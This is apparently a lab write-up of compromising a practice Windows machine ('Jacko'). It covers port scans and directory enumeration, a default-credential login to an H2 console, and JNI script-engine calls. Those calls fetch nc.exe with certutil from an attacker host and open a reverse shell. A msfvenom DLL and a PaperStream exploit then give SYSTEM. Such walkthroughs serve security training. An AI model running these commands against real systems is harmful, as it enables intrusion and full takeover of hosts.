# 7.Jacko
## Reconnaissance
### All port scanning
* `nmap -p- -T4 -sS --min-rate 1000 -oN Results_tcp.txt 192.168.149.66`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 20:37 +0530
Nmap scan report for 192.168.149.66
Host is up (0.089s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8082/tcp  open  blackice-alerts
9092/tcp  open  XmlIpcRegSvc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 47.40 seconds
```
#### TCP
* `PORTS=$(grep -E '^[0-9]+/(tcp|udp)' Results_tcp.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')`
* `nmap -A -p $PORTS -oN targeted_services.txt 192.168.149.66`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 20:39 +0530
Nmap scan report for 192.168.149.66
Host is up (0.11s latency).

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
7680/tcp  closed pando-pub
8082/tcp  open   http          H2 database http console
|_http-title: H2 Console
9092/tcp  open   XmlIpcRegSvc?
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.99%I=7%D=9/2%Time=6A983C33%P=x86_64-pc-linux-gnu%r(NUL
SF:L,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informix
SF:,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0t
SF:\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0
SF:s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\
SF:0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h
SF:\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.\
SF:0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\0
SF:t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R\
SF:0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20
SF:\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x2
SF:0\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\
SF:0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x0
SF:09\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\
SF:0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\
SF:0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0
SF:\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0
SF:\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0
SF:n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0
SF:b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r\
SF:0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0
SF:D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0
SF:t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x2
SF:0\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=9/2%OT=80%CT=7680%CU=34891%PV=Y%DS=4%DC=T%G=Y%TM=6A983
OS:CF6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP
OS:=104%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%TS=
OS:U)SEQ(SP=FB%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=106%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578
OS:NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)EC
OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-09-02T15:12:41
|_  start_date: N/A

TRACEROUTE (using port 7680/tcp)
HOP RTT       ADDRESS
1   163.12 ms 192.168.45.1
2   163.01 ms 192.168.45.254
3   163.14 ms 192.168.251.1
4   163.25 ms 192.168.149.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.35 seconds
```
#### UDP
* `nmap -sU -A --top-ports 20 -oN Results_udp.txt 192.168.149.66`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 20:37 +0530
Nmap scan report for 192.168.149.66
Host is up (0.12s latency).

PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
Device type: general purpose
Running: Microsoft Windows 2008|2012|7|8.1|Vista, Novell NetWare 6.X
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista cpe:/o:novell:netware:6
Too many fingerprints match this host to give specific OS details
Network Distance: 4 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   162.46 ms 192.168.45.1
2   162.36 ms 192.168.45.254
3   162.48 ms 192.168.251.1
4   96.44 ms  192.168.149.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.21 seconds
```

### Web
After viewing the webpage to `http://192.168.149.66` this was shown.<br>
![Website](/7.Jacko/images/Website.png)<br>
and Port 8082 showed this.<br>
![Alt_web](/7.Jacko/images/Port_8082.png)<br>
#### Sub-Directory Enumeration
*`gobuster dir -u http://192.168.149.66/ -w /usr/share/wordlists/dirb/common.txt`
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.149.66/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
help                 (Status: 301) [Size: 150] [--> http://192.168.149.66/help/]
Help                 (Status: 301) [Size: 150] [--> http://192.168.149.66/Help/]
HTML                 (Status: 301) [Size: 150] [--> http://192.168.149.66/HTML/]
html                 (Status: 301) [Size: 150] [--> http://192.168.149.66/html/]
Images               (Status: 301) [Size: 152] [--> http://192.168.149.66/Images/]
images               (Status: 301) [Size: 152] [--> http://192.168.149.66/images/]
index.html           (Status: 200) [Size: 1595]
javadoc              (Status: 301) [Size: 153] [--> http://192.168.149.66/javadoc/]
text                 (Status: 301) [Size: 150] [--> http://192.168.149.66/text/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
* `gobuster dir -u http://192.168.149.66:8082 -w /usr/share/wordlists/dirb/common.txt`
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.149.66:8082
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
favicon.ico          (Status: 200) [Size: 4286]
index.html           (Status: 200) [Size: 937]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
> Nothing interesting in Directory-Busting.
## Exploitation
We directly got access into H2 database with default credentials in `port 8082` ie:
> username: sa<br>
> password: 

![Login](/7.Jacko/images/Default_cred_exploit.png)<br>

```
searchsploit H2 database
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
H2 Database - 'Alias' Arbitrary Code Execution                                                                                                                                 | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                                                                                                    | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                                                                                                   | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                                                                                                       | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                                                                                     | multiple/remote/31010.sql
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
We found the exploit for version 1.4.199, and now we just follow the steps.
* Using javascriptengine we were able to find out `whoami`.<br>
![Whoami](/7.Jacko/images/Whoami.png)<br>
We will send 'nc.exe' via this javascriptengine to our target machine.<br> 
![nc.exe](/7.Jacko/images/Sending_nc.exe.png)<br>
    ```
    CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.190:1234/nc.exe C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
    ```
We will now send request to our target using the uploaded `nc.exe` and javascriptengine.<br>
`CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/nc.exe 192.168.45.190 1234 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');`
We got in and we found the User flag.
    
```
    C:\Users\tony\Desktop>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is AC2F-6399

    Directory of C:\Users\tony\Desktop

    07/09/2020  12:10 PM    <DIR>          .
    07/09/2020  12:10 PM    <DIR>          ..
    09/02/2026  08:05 AM                34 local.txt
    04/22/2020  04:23 AM             1,450 Microsoft Edge.lnk
                2 File(s)          1,484 bytes
                2 Dir(s)   7,194,050,560 bytes free

    C:\Users\tony\Desktop>type local.txt
    type local.txt
    41eda1d0dfb2c96bfb88cac5371a26b1
```
### Privelage Escalation

```
searchsploit paperstream
-------------------------------------------------------------------- ---------------------------------
Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation     | windows/local/49382.ps1
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

* Using the instructions provided we will be creating reverse shell using msfvenom.

    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.190 LPORT=1234 -f dll -o UninOldIS.dll
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder specified, outputting raw payload
    Payload size: 324 bytes
    Final size of dll file: 9216 bytes
    Saved as: UninOldIS.dll
    ```
* Now we transfer both of the files [exploit.ps1](/7.Jacko/sources/exploit.ps1) and [UninOldIS.dll](/7.Jacko/sources/UninOldIS.dll) to our target machine using `certutil`.<br>
    `certutil -urlcache -split -f http://192.168.45.190:8000/exploit.ps1 C:/windows/temp/exploit.ps1`<br>
    `certutil -urlcache -split -f http://192.168.45.190:8000/UninOldIS.dll C:/windows/temp/UninOldIS.dll`

* Implementing Powershell Command to run [exploit](/7.Jacko/sources/exploit.ps1) `C:\Windows\System32\WindowsPowerShell\v1.0>powershell.exe C:/windows/Temp/exploit.ps1`
    
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [192.168.45.190] from (UNKNOWN) [192.168.149.66] 50372
    Microsoft Windows [Version 10.0.18363.836]
    (c) 2019 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system
    C:\Users\Administrator\Desktop>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is AC2F-6399

    Directory of C:\Users\Administrator\Desktop

    05/03/2022  06:32 PM    <DIR>          .
    05/03/2022  06:32 PM    <DIR>          ..
    04/27/2020  09:11 PM             1,450 Microsoft Edge.lnk
    09/02/2026  08:04 AM                34 proof.txt
                2 File(s)          1,484 bytes
                2 Dir(s)   7,192,797,184 bytes free

    C:\Users\Administrator\Desktop>type proof.txt
    type proof.txt
    9dc5639bb365058dd4f30af918e8fd60
    C:\Users\Administrator\Desktop>
    ```
# SOLVED!